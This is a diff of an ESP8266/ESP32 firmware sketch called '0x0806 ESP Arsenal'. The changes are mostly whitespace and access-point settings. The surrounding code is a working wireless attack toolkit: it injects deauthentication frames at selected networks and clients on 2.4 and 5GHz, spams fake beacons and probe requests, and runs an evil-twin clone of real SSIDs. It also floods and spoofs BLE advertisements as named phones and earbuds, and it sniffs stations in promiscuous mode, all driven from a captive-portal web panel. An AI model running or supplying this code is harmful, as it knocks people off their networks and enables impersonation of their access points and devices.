@@ -1,4 +1,3 @@
-
 /*
  * 0x0806 ESP Arsenal - Advanced WiFi/BLE Security Testing Platform
  * Compatible with ESP8266 and ESP32
@@ -797,7 +796,7 @@ body {
     <div class="status STATUS_CLASS">
       <span id="attackStatus">ATTACK_STATUS</span>
     </div>
-    
+
     <div class="attack-grid">
       <div class="attack-card">
         <h3>Deauthentication</h3>
@@ -873,26 +872,20 @@ body {
 
 <script>
 function showSection(section) {
-  var sections = document.querySelectorAll('.section');
-  for (var i = 0; i < sections.length; i++) {
-    sections[i].style.display = 'none';
-  }
-  var navBtns = document.querySelectorAll('.nav-btn');
-  for (var i = 0; i < navBtns.length; i++) {
-    navBtns[i].classList.remove('active');
-  }
-  document.getElementById(section).style.display = 'block';
-  event.target.classList.add('active');
+  document.querySelectorAll(\".section\").forEach(s => s.style.display = \"none\");
+  document.querySelectorAll(\".nav-btn\").forEach(b => b.classList.remove(\"active\"));
+  document.getElementById(section).style.display = \"block\";
+  event.target.classList.add(\"active\");
 }
 
 function scanNetworks() {
-  fetch('/api?action=scan_networks').then(function(r) { return r.text(); }).then(function(d) { 
+  fetch(\"/api?action=scan_networks\").then(function(r) { return r.text(); }).then(function(d) { 
     setTimeout(function() { location.reload(); }, 1000); 
   });
 }
 
 function scanStations() {
-  fetch('/api?action=scan_stations').then(function(r) { return r.text(); }).then(function(d) { 
+  fetch(\"/api?action=scan_stations\").then(function(r) { return r.text(); }).then(function(d) { 
     setTimeout(function() { location.reload(); }, 1000); 
   });
 }
@@ -959,11 +952,11 @@ function saveSettings() {
     dualBand: document.getElementById('dualBand').checked,
     bleEnabled: document.getElementById('bleEnabled').checked
   };
-  
+
   var params = Object.keys(data).map(function(k) { 
     return k + '=' + encodeURIComponent(data[k]); 
   }).join('&');
-  
+
   fetch('/api?action=save_settings&' + params).then(function(r) { return r.text(); }).then(function(d) {
     alert('Settings saved successfully');
     setTimeout(function() { location.reload(); }, 500);
@@ -988,14 +981,14 @@ setInterval(function() {
 void setup() {
   Serial.begin(115200);
   delay(1000);
-  
+
   Serial.println("\n=== 0x0806 ESP Arsenal v3.0 ===");
   Serial.println("Platform: " PLATFORM);
   Serial.println("Initializing system...");
-  
+
   // Initialize storage
   EEPROM.begin(EEPROM_SIZE);
-  
+
 #ifdef ESP32
   if (!SPIFFS.begin(true)) {
     Serial.println("SPIFFS Mount Failed");
@@ -1005,48 +998,48 @@ void setup() {
     Serial.println("LittleFS Mount Failed");
   }
 #endif
-  
+
   // Load settings from EEPROM
   loadSettings();
-  
+
   // Initialize WiFi
   WiFi.disconnect(true);
   delay(100);
-  
+
   // Setup Access Point with stable configuration
-  WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 4);
-  
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);
+
   // Configure AP IP
   IPAddress apIP(192, 168, 4, 1);
   IPAddress subnet(255, 255, 255, 0);
   WiFi.softAPConfig(apIP, apIP, subnet);
-  
+
   delay(2000);
-  
+
   IPAddress IP = WiFi.softAPIP();
   Serial.print("AP IP: ");
   Serial.println(IP);
-  
+
   // Setup DNS server for captive portal
   dnsServer.start(DNS_PORT, "*", IP);
-  
+
   // Setup web server
   setupWebServer();
-  
+
 #ifdef ESP32
   // Initialize BLE
   initializeBLE();
-  
+
   // Create tasks
   xTaskCreatePinnedToCore(attackTaskCore, "AttackTask", 8192, NULL, 2, &attackTask, 0);
   xTaskCreatePinnedToCore(monitorTaskCore, "MonitorTask", 8192, NULL, 1, &monitorTask, 1);
   xTaskCreatePinnedToCore(bleTaskCore, "BLETask", 8192, NULL, 1, &bleTask, 1);
-  
+
   // Initialize watchdog
   esp_task_wdt_init(30, true);
 #endif
-  
+
   systemReady = true;
   Serial.println("System ready!");
   Serial.println("Connect to: " AP_SSID);
@@ -1056,33 +1049,33 @@ void setup() {
 
 void loop() {
   if (!systemReady) return;
-  
+
   // Handle DNS and web requests
   dnsServer.processNextRequest();
   server.handleClient();
-  
+
   // Check AP stability
   if (millis() - lastAPCheck > 5000) {
     if (WiFi.softAPgetStationNum() == 0 && WiFi.status() != WL_CONNECTED) {
       // Restart AP if needed
-      WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 4);
+      WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);
     }
     lastAPCheck = millis();
   }
-  
+
   // Update statistics
   if (millis() - lastStatsUpdate > 1000) {
     updateStats();
     lastStatsUpdate = millis();
   }
-  
+
 #ifndef ESP32
   // Handle attacks on ESP8266 main loop
   if (attackRunning) {
     handleAttackESP8266();
   }
 #endif
-  
+
   yield();
 }
 
@@ -1092,14 +1085,14 @@ void setupWebServer() {
   server.on("/generate_204", HTTP_GET, handleRoot); // Android captive portal
   server.on("/fwlink", HTTP_GET, handleRoot); // Windows captive portal
   server.onNotFound(handleRoot);
-  
+
   server.begin();
   Serial.println("Web server started on port 80");
 }
 
 void handleRoot() {
   String html = htmlPage;
-  
+
   // Replace placeholders
   html.replace("PLATFORM_PLACEHOLDER", PLATFORM);
   html.replace("NETWORK_COUNT", String(networkCount));
@@ -1115,7 +1108,7 @@ void handleRoot() {
   html.replace("RANDOMIZE_CHECKED", randomizeChannel ? "checked" : "");
   html.replace("DUAL_BAND_CHECKED", dualBandMode ? "checked" : "");
   html.replace("BLE_ENABLED_CHECKED", bleEnabled ? "checked" : "");
-  
+
   // Generate network list
   String networkList = "";
   for (int i = 0; i < networkCount; i++) {
@@ -1127,7 +1120,7 @@ void handleRoot() {
     networkList += "</div></div>";
   }
   html.replace("NETWORK_LIST", networkList);
-  
+
   // Generate station list
   String stationList = "";
   for (int i = 0; i < stationCount; i++) {
@@ -1139,7 +1132,7 @@ void handleRoot() {
     stationList += "</div></div>";
   }
   html.replace("STATION_LIST", stationList);
-  
+
   // ESP32 specific attacks
 #ifdef ESP32
   String esp32Attacks = "\n<div class=\"attack-card\">\n<h3>BLE Spam</h3>\n<p>Flood area with BLE advertisements</p>\n<button class=\"btn\" onclick=\"startAttack(9)\">Start BLE Spam</button>\n</div>\n<div class=\"attack-card\">\n<h3>BLE Beacon Flood</h3>\n<p>Flood with various BLE beacons</p>\n<button class=\"btn\" onclick=\"startAttack(10)\">Start BLE Beacon</button>\n</div>\n<div class=\"attack-card\">\n<h3>BLE Spoofing</h3>\n<p>Spoof BLE device advertisements</p>\n<button class=\"btn\" onclick=\"startAttack(11)\">Start BLE Spoof</button>\n</div>\n<div class=\"attack-card\">\n<h3>5GHz Deauth</h3>\n<p>Deauth attack on 5GHz band</p>\n<button class=\"btn btn-danger\" onclick=\"startAttack(12)\">Start 5GHz Deauth</button>\n</div>\n<div class=\"attack-card\">\n<h3>Dual Band Attack</h3>\n<p>Simultaneous 2.4/5GHz attacks</p>\n<button class=\"btn\" onclick=\"startAttack(13)\">Start Dual Band</button>\n</div>";
@@ -1147,14 +1140,14 @@ void handleRoot() {
 #else
   html.replace("ESP32_ATTACKS", "");
 #endif
-  
+
   server.send(200, "text/html", html);
 }
 
 void handleAPI() {
   String action = server.arg("action");
   String response = "OK";
-  
+
   if (action == "scan_networks") {
     scanNetworks();
   } else if (action == "scan_stations") {
@@ -1185,7 +1178,7 @@ void handleAPI() {
     server.send(200, "application/json", response);
     return;
   }
-  
+
   server.send(200, "text/plain", response);
 }
 
@@ -1193,10 +1186,10 @@ void scanNetworks() {
   Serial.println("Scanning networks...");
   networkCount = 0;
   selectedNetworks = 0;
-  
+
   WiFi.mode(WIFI_STA);
   int n = WiFi.scanNetworks(false, true);
-  
+
   for (int i = 0; i < n && networkCount < MAX_NETWORKS; i++) {
     if (WiFi.SSID(i).length() > 0) {
       networks[networkCount].ssid = WiFi.SSID(i);
@@ -1213,10 +1206,10 @@ void scanNetworks() {
       networkCount++;
     }
   }
-  
-  WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 4);
-  
+
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);
+
   Serial.println("Network scan complete: " + String(networkCount) + " networks found");
 }
 
@@ -1224,7 +1217,7 @@ void scanStations() {
   Serial.println("Scanning stations...");
   stationCount = 0;
   selectedStations = 0;
-  
+
 #ifdef ESP32
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&promiscuousCallback);
@@ -1233,38 +1226,38 @@ void scanStations() {
   wifi_promiscuous_enable(1);
   wifi_set_promiscuous_rx_cb(promiscuousCallback);
 #endif
-  
+
   delay(10000); // Scan for 10 seconds
-  
+
 #ifdef ESP32
   esp_wifi_set_promiscuous(false);
 #else
   wifi_promiscuous_enable(0);
 #endif
-  
-  WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 4);
-  
+
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);
+
   Serial.println("Station scan complete: " + String(stationCount) + " stations found");
 }
 
 void startAttack(AttackType type) {
   if (attackRunning) stopAttack();
-  
+
   currentAttack = type;
   attackRunning = true;
   attackStartTime = millis();
   totalPackets = 0;
   lastPacketCount = 0;
-  
+
   Serial.println("Starting attack type: " + String(type));
-  
+
   // Configure for attacks
   if (randomizeChannel) {
     attackChannel = random(1, 15);
     attack5GHzChannel = random(36, 165);
   }
-  
+
 #ifdef ESP32
   if (type >= ATTACK_BLE_SPAM && type <= ATTACK_BLE_SPOOF) {
     if (!bleInitialized) initializeBLE();
@@ -1274,10 +1267,10 @@ void startAttack(AttackType type) {
 
 void stopAttack() {
   if (!attackRunning) return;
-  
+
   attackRunning = false;
   currentAttack = ATTACK_NONE;
-  
+
 #ifdef ESP32
   esp_wifi_set_promiscuous(false);
   if (bleInitialized && pAdvertising) {
@@ -1286,10 +1279,10 @@ void stopAttack() {
 #else
   wifi_promiscuous_enable(0);
 #endif
-  
-  WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 4);
-  
+
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);
+
   Serial.println("Attack stopped");
 }
 
@@ -1305,17 +1298,17 @@ void updateStats() {
 void loadSettings() {
   attackChannel = EEPROM.read(0);
   if (attackChannel < 1 || attackChannel > 14) attackChannel = 6;
-  
+
   randomizeChannel = EEPROM.read(1) == 1;
   beaconInterval = EEPROM.read(2) | (EEPROM.read(3) << 8);
   if (beaconInterval < 10 || beaconInterval > 1000) beaconInterval = 100;
-  
+
   deauthInterval = EEPROM.read(4) | (EEPROM.read(5) << 8);
   if (deauthInterval < 10 || deauthInterval > 1000) deauthInterval = 20;
-  
+
   dualBandMode = EEPROM.read(6) == 1;
   bleEnabled = EEPROM.read(7) == 1;
-  
+
   attack5GHzChannel = EEPROM.read(8) | (EEPROM.read(9) << 8);
   if (attack5GHzChannel < 36 || attack5GHzChannel > 165) attack5GHzChannel = 36;
 }
@@ -1328,7 +1321,7 @@ void saveSettingsFromWeb() {
   deauthInterval = server.arg("deauthInterval").toInt();
   dualBandMode = server.arg("dualBand") == "true";
   bleEnabled = server.arg("bleEnabled") == "true";
-  
+
   // Save to EEPROM
   EEPROM.write(0, attackChannel);
   EEPROM.write(1, randomizeChannel ? 1 : 0);
@@ -1347,7 +1340,7 @@ void saveSettingsFromWeb() {
 #ifndef ESP32
 void handleAttackESP8266() {
   if (!attackRunning) return;
-  
+
   switch (currentAttack) {
     case ATTACK_DEAUTH:
       performDeauth();
@@ -1459,27 +1452,27 @@ void bleTaskCore(void* parameter) {
 
 void initializeBLE() {
   if (bleInitialized) return;
-  
+
   esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
   esp_bt_controller_init(&bt_cfg);
   esp_bt_controller_enable(ESP_BT_MODE_BLE);
   esp_bluedroid_init();
   esp_bluedroid_enable();
-  
+
   BLEDevice::init("0x0806-Arsenal");
   pAdvertising = BLEDevice::getAdvertising();
-  
+
   bleInitialized = true;
   Serial.println("BLE initialized");
 }
 
 void performBLESpam() {
   if (!bleInitialized) return;
-  
+
   BLEAdvertisementData advData;
   String deviceName = "BLE-" + String(random(1000, 9999));
   advData.setName(deviceName);
-  
+
   // Random manufacturer data
   uint8_t mfgData[20];
   for (int i = 0; i < 20; i++) {
@@ -1487,22 +1480,22 @@ void performBLESpam() {
   }
   std::string mfgString((char*)mfgData, 20);
   advData.setManufacturerData(mfgString);
-  
+
   pAdvertising->setAdvertisementData(advData);
   pAdvertising->start();
-  
+
   vTaskDelay(pdMS_TO_TICKS(100));
   pAdvertising->stop();
-  
+
   blePackets++;
   totalPackets++;
 }
 
 void performBLEBeacon() {
   if (!bleInitialized) return;
-  
+
   BLEAdvertisementData advData;
-  
+
   // Create various beacon types
   static int beaconType = 0;
   switch (beaconType % 3) {
@@ -1525,13 +1518,13 @@ void performBLEBeacon() {
       advData.setName("Custom-Beacon-" + String(random(1000, 9999)));
       break;
   }
-  
+
   pAdvertising->setAdvertisementData(advData);
   pAdvertising->start();
-  
+
   vTaskDelay(pdMS_TO_TICKS(50));
   pAdvertising->stop();
-  
+
   beaconType++;
   blePackets++;
   totalPackets++;
@@ -1539,29 +1532,29 @@ void performBLEBeacon() {
 
 void performBLESpoof() {
   if (!bleInitialized) return;
-  
+
   BLEAdvertisementData advData;
-  
+
   // Spoof common device names
   String deviceNames[] = {
     "iPhone", "Samsung Galaxy", "AirPods Pro", "Apple Watch", 
     "Pixel Buds", "Surface Laptop", "MacBook Pro", "iPad",
     "Galaxy Watch", "Beats Studio", "JBL Speaker", "Bose QC"
   };
-  
+
   String deviceName = deviceNames[random(12)] + "-" + String(random(100, 999));
   advData.setName(deviceName);
-  
+
   // Add realistic service UUIDs
   BLEUUID serviceUUID = BLEUUID(random(0x1000, 0xFFFF));
   advData.setServiceUUID(serviceUUID);
-  
+
   pAdvertising->setAdvertisementData(advData);
   pAdvertising->start();
-  
+
   vTaskDelay(pdMS_TO_TICKS(200));
   pAdvertising->stop();
-  
+
   blePackets++;
   totalPackets++;
 }
@@ -1573,19 +1566,19 @@ void perform5GHzDeauth() {
       uint8_t bssid[6];
       sscanf(networks[i].bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
              &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
-      
+
       // Set channel to 5GHz
       esp_wifi_set_channel(networks[i].channel, WIFI_SECOND_CHAN_NONE);
-      
+
       // Update deauth packet
       memcpy(&deauthPacket[4], bssid, 6);
       memcpy(&deauthPacket[10], bssid, 6);
       memcpy(&deauthPacket[16], bssid, 6);
-      
+
       // Send broadcast deauth
       memset(&deauthPacket[4], 0xFF, 6);
       esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
-      
+
       totalPackets++;
       wifiPackets++;
     }
@@ -1595,7 +1588,7 @@ void perform5GHzDeauth() {
 
 void performDualBandAttack() {
   static bool band24 = true;
-  
+
   if (band24) {
     // 2.4GHz attack
     esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
@@ -1605,26 +1598,26 @@ void performDualBandAttack() {
     esp_wifi_set_channel(attack5GHzChannel, WIFI_SECOND_CHAN_NONE);
     perform5GHzDeauth();
   }
-  
+
   band24 = !band24;
 }
 
 void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (stationCount >= MAX_STATIONS) return;
-  
+
   wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
   uint8_t* frame = pkt->payload;
   uint16_t frameLen = pkt->rx_ctrl.sig_len;
-  
+
   if (frameLen < 24) return;
-  
+
   uint8_t frameType = frame[0] & 0xFC;
-  
+
   if (frameType == 0x08 || frameType == 0x40) {
     char macStr[18];
     sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x",
             frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);
-    
+
     bool exists = false;
     for (int i = 0; i < stationCount; i++) {
       if (stations[i].mac == String(macStr)) {
@@ -1632,7 +1625,7 @@ void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
         break;
       }
     }
-    
+
     if (!exists) {
       stations[stationCount].mac = String(macStr);
       sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x",
@@ -1650,19 +1643,19 @@ void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
 // ESP8266 promiscuous callback
 void promiscuousCallback(uint8_t* buf, uint16_t len) {
   if (stationCount >= MAX_STATIONS) return;
-  
+
   uint8_t* frame = buf + 12;
   uint16_t frameLen = len - 12;
-  
+
   if (frameLen < 24) return;
-  
+
   uint8_t frameType = frame[0] & 0xFC;
-  
+
   if (frameType == 0x08 || frameType == 0x40) {
     char macStr[18];
     sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x",
             frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);
-    
+
     bool exists = false;
     for (int i = 0; i < stationCount; i++) {
       if (stations[i].mac == String(macStr)) {
@@ -1670,7 +1663,7 @@ void promiscuousCallback(uint8_t* buf, uint16_t len) {
         break;
       }
     }
-    
+
     if (!exists) {
       stations[stationCount].mac = String(macStr);
       sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x",
@@ -1692,49 +1685,49 @@ void performDeauth() {
       uint8_t bssid[6];
       sscanf(networks[i].bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
              &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
-      
+
 #ifdef ESP32
       esp_wifi_set_channel(networks[i].channel, WIFI_SECOND_CHAN_NONE);
 #else
       wifi_set_channel(networks[i].channel);
 #endif
-      
+
       memcpy(&deauthPacket[4], bssid, 6);
       memcpy(&deauthPacket[10], bssid, 6);
       memcpy(&deauthPacket[16], bssid, 6);
-      
+
       memset(&deauthPacket[4], 0xFF, 6);
-      
+
 #ifdef ESP32
       esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
 #else
       wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
 #endif
-      
+
       totalPackets++;
       wifiPackets++;
-      
+
       for (int j = 0; j < stationCount; j++) {
         if (stations[j].selected && stations[j].bssid == networks[i].bssid) {
           uint8_t staMac[6];
           sscanf(stations[j].mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &staMac[0], &staMac[1], &staMac[2], &staMac[3], &staMac[4], &staMac[5]);
-          
+
           memcpy(&deauthPacket[4], staMac, 6);
-          
+
 #ifdef ESP32
           esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
 #else
           wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
 #endif
-          
+
           totalPackets++;
           wifiPackets++;
         }
       }
     }
   }
-  
+
 #ifdef ESP32
   vTaskDelay(pdMS_TO_TICKS(deauthInterval));
 #else
@@ -1744,27 +1737,27 @@ void performDeauth() {
 
 void performBeaconSpam() {
   static int beaconCounter = 0;
-  
+
   String fakeSSID = "0x0806-Fake-" + String(beaconCounter++);
   if (beaconCounter > 999) beaconCounter = 0;
-  
+
   uint8_t fakeBSSID[6];
   for (int i = 0; i < 6; i++) {
     fakeBSSID[i] = random(256);
   }
-  
+
   uint8_t beacon[256];
   memcpy(beacon, beaconPacket, 38);
-  
+
   memcpy(&beacon[10], fakeBSSID, 6);
   memcpy(&beacon[16], fakeBSSID, 6);
-  
+
   beacon[38] = 0x00;
   beacon[39] = fakeSSID.length();
   memcpy(&beacon[40], fakeSSID.c_str(), fakeSSID.length());
-  
+
   int beaconLen = 40 + fakeSSID.length();
-  
+
   if (randomizeChannel) {
     int ch = random(1, 15);
 #ifdef ESP32
@@ -1773,16 +1766,16 @@ void performBeaconSpam() {
     wifi_set_channel(ch);
 #endif
   }
-  
+
 #ifdef ESP32
   esp_wifi_80211_tx(WIFI_IF_STA, beacon, beaconLen, false);
 #else
   wifi_send_pkt_freedom(beacon, beaconLen, 0);
 #endif
-  
+
   totalPackets++;
   wifiPackets++;
-  
+
 #ifdef ESP32
   vTaskDelay(pdMS_TO_TICKS(beaconInterval));
 #else
@@ -1792,35 +1785,35 @@ void performBeaconSpam() {
 
 void performProbeSpam() {
   static int probeCounter = 0;
-  
+
   String fakeSSID = "Probe-" + String(probeCounter++);
   if (probeCounter > 999) probeCounter = 0;
-  
+
   uint8_t probe[256];
   memcpy(probe, beaconPacket, 24);
   probe[0] = 0x40;
-  
+
   uint8_t fakeMac[6];
   for (int i = 0; i < 6; i++) {
     fakeMac[i] = random(256);
   }
   memcpy(&probe[10], fakeMac, 6);
-  
+
   probe[24] = 0x00;
   probe[25] = fakeSSID.length();
   memcpy(&probe[26], fakeSSID.c_str(), fakeSSID.length());
-  
+
   int probeLen = 26 + fakeSSID.length();
-  
+
 #ifdef ESP32
   esp_wifi_80211_tx(WIFI_IF_STA, probe, probeLen, false);
 #else
   wifi_send_pkt_freedom(probe, probeLen, 0);
 #endif
-  
+
   totalPackets++;
   wifiPackets++;
-  
+
 #ifdef ESP32
   vTaskDelay(pdMS_TO_TICKS(50));
 #else
@@ -1836,34 +1829,34 @@ void performEvilTwin() {
   for (int i = 0; i < networkCount; i++) {
     if (networks[i].selected) {
       String ssid = networks[i].ssid;
-      
+
       uint8_t fakeBSSID[6];
       for (int j = 0; j < 6; j++) {
         fakeBSSID[j] = random(256);
       }
-      
+
       uint8_t beacon[256];
       memcpy(beacon, beaconPacket, 38);
       memcpy(&beacon[10], fakeBSSID, 6);
       memcpy(&beacon[16], fakeBSSID, 6);
-      
+
       beacon[38] = 0x00;
       beacon[39] = ssid.length();
       memcpy(&beacon[40], ssid.c_str(), ssid.length());
-      
+
       int beaconLen = 40 + ssid.length();
-      
+
 #ifdef ESP32
       esp_wifi_80211_tx(WIFI_IF_STA, beacon, beaconLen, false);
 #else
       wifi_send_pkt_freedom(beacon, beaconLen, 0);
 #endif
-      
+
       totalPackets++;
       wifiPackets++;
     }
   }
-  
+
 #ifdef ESP32
   vTaskDelay(pdMS_TO_TICKS(beaconInterval));
 #else
@@ -1882,7 +1875,7 @@ void performHandshakeCapture() {
 void performMonitor() {
   totalPackets++;
   wifiPackets++;
-  
+
 #ifdef ESP32
   vTaskDelay(pdMS_TO_TICKS(10));
 #else
